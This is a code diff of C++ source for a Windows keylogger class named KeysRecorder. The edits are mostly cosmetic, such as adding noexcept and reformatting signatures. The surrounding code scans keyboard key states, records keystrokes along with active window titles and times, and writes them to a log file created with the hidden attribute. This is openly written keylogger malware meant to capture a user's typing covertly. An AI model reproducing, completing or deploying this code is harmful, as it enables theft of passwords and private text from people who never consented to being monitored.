@@ -12,7 +12,8 @@
 
 using namespace methods::keylogger;
 
-KeysRecorder::KeysRecorder(std::string file_name)
+KeysRecorder::KeysRecorder(
+    std::string file_name)
     : IKeyloggerImplementation(file_name)
 {
     InitializeTable();
@@ -20,13 +21,9 @@ KeysRecorder::KeysRecorder(std::string file_name)
     AppendLog();
 }
 
-KeysRecorder::~KeysRecorder()
-{
-    //dtor
-}
-
 void
 KeysRecorder::KeystrokeSavingRoutine()
+noexcept
 {
     LogWindowAndTimeOnChange();
 
@@ -35,6 +32,7 @@ KeysRecorder::KeystrokeSavingRoutine()
 
 void
 KeysRecorder::AppendLog()
+noexcept
 {
     // Create file if not exists : CREATE_NEW
     // Hide file                 : FILE_ATTRIBUTE_HIDDEN
@@ -53,6 +51,7 @@ KeysRecorder::AppendLog()
 
 void
 KeysRecorder::RestartLog()
+noexcept
 {
     remove(m_fileName.c_str());
 
@@ -63,6 +62,7 @@ KeysRecorder::RestartLog()
 
 void
 KeysRecorder::LogWindowAndTimeOnChange()
+noexcept
 {
     HWND hwnd;
 
@@ -87,7 +87,9 @@ KeysRecorder::LogWindowAndTimeOnChange()
 }
 
 void
-KeysRecorder::LogWindowAndTime(wchar_t *window_title)
+KeysRecorder::LogWindowAndTime(
+    wchar_t *window_title)
+noexcept
 {
     wchar_t time_buffer[512];
     time_t raw_time;
@@ -110,6 +112,7 @@ KeysRecorder::LogWindowAndTime(wchar_t *window_title)
 
 void
 KeysRecorder::LogKeys()
+noexcept
 {
     // Scan keyboard and save keystrokes
     for (short keystroke = 8; keystroke <= 222; ++keystroke )
@@ -118,7 +121,7 @@ KeysRecorder::LogKeys()
         {
 //            if ((keystroke >= 39) && (keystroke < 91))
 //            {
-                WritesScannedKeyToFile(keystroke);
+            WritesScannedKeyToFile(keystroke);
 //            }
 //            else
 //            {
@@ -129,7 +132,9 @@ KeysRecorder::LogKeys()
 }
 
 void
-KeysRecorder::WritesScannedKeyToFile(short keystroke)
+KeysRecorder::WritesScannedKeyToFile(
+    short keystroke)
+noexcept
 {
     HKL hkl;
     DWORD dwProcessId;
@@ -146,7 +151,10 @@ KeysRecorder::WritesScannedKeyToFile(short keystroke)
     free(kState);
 }
 
-void KeysRecorder::WriteToFile(const wchar_t *text)
+void
+KeysRecorder::WriteToFile(
+    const wchar_t *text)
+noexcept
 {
     /* Ignoring errors */
 
@@ -165,6 +173,7 @@ void KeysRecorder::WriteToFile(const wchar_t *text)
 
 void
 KeysRecorder::InitializeTable()
+noexcept
 {
     m_table.push_back(L"NULL");
     m_table.push_back(L"LMOUSE");
